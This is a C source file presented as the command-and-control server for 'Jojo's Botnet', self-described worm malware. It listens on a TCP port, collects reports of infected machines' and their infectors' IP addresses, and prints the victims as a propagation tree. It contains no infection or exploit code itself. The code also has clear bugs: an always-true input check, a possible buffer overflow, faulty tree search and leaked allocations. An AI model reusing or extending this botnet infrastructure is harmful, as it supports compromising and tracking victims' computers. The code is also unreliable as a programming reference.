# include <stdio.h>
# include <string.h>
# include <winsock2.h>
# include <ws2tcpip.h>
# include <stdlib.h>
# define DEFAULT_PORT "23019"
# define DEFAULT_BUFLEN 512
# define C2_IP "10.0.0.25"
# define MAXENDP 100 // This code records a maximum of 100 endpoints, INCLUDEING the C&C
# define LINE_FEED 10
# define MAX_IP_LEN 16
#define PADDING_DIFF 5
#define SOCKET_STOP "0\n"

/*
Name: Jojo's_Botnet
Written by: Ori P
Date: 1/3/23

This code is the server-side for "Jojo's Botnet" dangerous worm type malware.
The code receives TCP transmissions from infected computers and saves it as a tree.
Finally it prints the whole tree.  
*/

// TO DO --> Add victim ip input check

// Structures
typedef struct tnode {
	char* victim_ip;
	struct tnode* father;
	struct tnode* children[MAXENDP - 1]; // A child node must have at least 2 other node before him.
} treenode;
struct addrinfo* result = NULL, * ptr = NULL, hints;


//Function Declarations
SOCKET Socket_Accept();
int Recive_Data(SOCKET ClientSocket, char * ip, char *f_ip);
treenode* Add_Node(treenode* pnode, treenode* server, char* victim_ip, char* father);
//struct tnode* Search_Node(treenode *root, char *ip);
treenode* Search_Node(treenode *root, char *ip);
void Add_Child(treenode *father, treenode *child);
int Process_IP(char str[]);
void Print_Tree(treenode *node, int padding);


int main(){
		
		//Initializing server node
		treenode server, *pserver;
		pserver = (treenode *) malloc(sizeof(treenode));
		pserver = &server;
		pserver->victim_ip = strdup(C2_IP);
		pserver->father = NULL;
		
		// Initialize children[] to 0.
		for(int i = 0; i < MAXENDP-1; i++){
			pserver->children[i] = 0;
		}
		
		// Receive until the peer shuts down the connection or maxium endpoints have been infected.
		for(int i = 0; i < MAXENDP; i++){
			// Open socket.
			SOCKET ClientSocket = Socket_Accept();
			char *ip, *f_ip;
			ip = (char *) malloc((MAX_IP_LEN + 1) * sizeof(char));
			f_ip = (char *) malloc((MAX_IP_LEN + 1) * sizeof(char));
			Recive_Data(ClientSocket, ip, f_ip);
			
			// Check to confirm that the father exists in the tree.
			while(Search_Node(pserver, f_ip) == NULL){
				printf("Jojo_BN: Could not find %s in infected computers\n", f_ip);
				closesocket(ClientSocket);
				WSACleanup();
				SOCKET ClientSocket = Socket_Accept();
				Recive_Data(ClientSocket, ip, f_ip);
			}
			
			treenode newnode, *mynode; 
			mynode = &newnode;
			mynode = (treenode *) malloc(sizeof(treenode));
			mynode = Add_Node(mynode, pserver, ip, f_ip);
			
			// Cleanup.
			closesocket(ClientSocket);
			WSACleanup(); 
		}
		
		// Print all nodes.
		printf("\n---Infected Computers---");
		printf("\n");
		Print_Tree(pserver, 0);
		printf("\n");
		printf("You Did It!!!");
		
		return 0;
}	

treenode* Add_Node(treenode* pnode, treenode *server, char* victim_ip, char* father_ip) {
	// Adds a new node to the tree. Assigning relevant values to relevant nodes as well (father, victim_ip...).
	
	pnode->victim_ip = (char *) malloc(sizeof(char));
	pnode->victim_ip = strdup(victim_ip); // initializing victim_ip
	
	treenode *pfather_node = (treenode *) malloc(sizeof(treenode));
	
	// Check if the C&C is the father.
	if(!strcmp(father_ip, C2_IP)){
		pfather_node = server;
	}
	else{
		pfather_node = Search_Node(server, father_ip);
	}
	pnode->father = (treenode *) malloc(sizeof(treenode));
	pnode->father = pfather_node; // sets pointer to father
	
	// Initialize children[] to 0.
	for(int i = 0; i < MAXENDP-1; i++){
		pnode->children[i] = (treenode *) malloc(sizeof(treenode));
		pnode->children[i] = NULL;
	}
	
	// Adding the new node to it's father's children array.
	Add_Child(pfather_node, pnode);
	return pnode;
}

treenode* Search_Node(treenode *node, char *ip) {
	// Searches the constant everyone[] for a specific node.
	
	// Check if current node is the father.
	if(!strcmp(node->victim_ip, ip)){
			return node;
		}
	
	// Go over node's children.
	for(int j = 0; node->children[j] != NULL; j++){
	
		// Go over node's children IP adressess.
		for(int i = 0; node->children[i] != NULL; i++){
			
			// Compare node IP adress with argumet address
			if(!strcmp(node->children[i]->victim_ip, ip)){
				return node->children[i];
			}
		}
		node = Search_Node(node->children[j], ip);
		return node;
		
	}
	printf("Jojo_BN\\Search_Node: ERROR - node %s (%p) ip %s", node->victim_ip, node, ip);
	printf("\n");
	return NULL;
}

void Add_Child(treenode *father, treenode *child){
	// Adds a member to first free spot inside the childern array of a node. 
	int i = 0;
	
	// 
	while(father->children[i]){
		i++;
		}
	father->children[i] = child;
}

void Print_Tree(treenode *node, int padding){
	// Prints the whole tree.
		
	// Check if node has children. 
	if(node->children[0] != NULL){
		printf("%*c%s\n", padding, ' ', node->victim_ip);
		
		// Prints every child.
		for(int i = 0; node->children[i] != NULL; i++)
			Print_Tree(node->children[i], padding + PADDING_DIFF);
	}
	else{
		printf("%*c%s\n", padding, ' ',node->victim_ip);
	}
	return;
	
}

SOCKET Socket_Accept() {
	/*
	This function creates a socket on the server (this computer) and binds it on port DEFAULT_PORT.
	Then the function listens for connections and accepts them- returning a socket with the accepted client.
	*/

	struct addrinfo* result = NULL, * ptr = NULL, hints;

	WSADATA wsaData;
	int iResult;

	// Initialize winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the local address and port to be used by the server
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);

	// Check if address info was successfully obtained.
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		exit(1);
	}

	// Creating the socket
	SOCKET ListenSocket = INVALID_SOCKET;
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	// Check if socket is valid.
	if (ListenSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		exit(1);
	}

	// Setup the TCP listening socket.
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	
	// Check for binding error.
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		exit(1);
	}
	freeaddrinfo(result);
	printf("Listening for connection...\n");
	
	// Listening on DEFAULT_PORT and checking for errors.
	if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
		printf("Listen failed with error: %ld\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(1);
	}
	SOCKET ClientSocket;

	// Accept a client socket.
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		exit(1);
	}
	return ClientSocket;
}

int Process_IP(char str[]){
// Remove unnecessary charachters from recived data and check for illegal input.
	
	int j = 0;
	char temp[MAX_IP_LEN];
	
	// Go over every charachter in argument string.
	for(int i = 0; str[i] != '\0'; i++){
		
		// Skip spaces/blanks.
		if(str[i] != '\n' && str[i] != ' ' && str[i] != LINE_FEED){
			
			// Verify that data is digits.
			if( '9' >= str[i] || str[i] >= '0' || str[i] == '.'){  // I didn't use isdigit() to spare this only use of ctype.h
				temp[j++] = str[i];
			}
			else{
				printf("Jojo_BN\\Process_IP: Illegal IP address.");
				return 0;
			}
		}
	}
	temp[j] = '\0';
	strcpy(str, temp);
	return 1;
}

int Recive_Data(SOCKET ClientSocket, char * ip, char *f_ip){
	// Recive data from client and assign it to the function's arguments.
	
	char recvbuf[DEFAULT_BUFLEN];
	int recv_res;
	int recvbuflen = DEFAULT_BUFLEN;
	
	// Recive 2 strings of data: victim ip and father ip.
	for(int i = 1; i <= 2; i++){
			memset(recvbuf, '\0', DEFAULT_BUFLEN);
			recv_res = recv(ClientSocket, recvbuf, recvbuflen, 0);
			
			// Verify that data was sent
			if(recv_res > 0){
				Process_IP(recvbuf);
				printf("Data Recived: %s\n", recvbuf);
				
				// Assign data to victim's ip or father's ip by order.
				switch(i){
					case 1:
						strcpy(ip, recvbuf);
						break;
					case 2:
						strcpy(f_ip, recvbuf);
						break;
				}
			}
			else{
				return 0;
			}
		}
	return 1;
}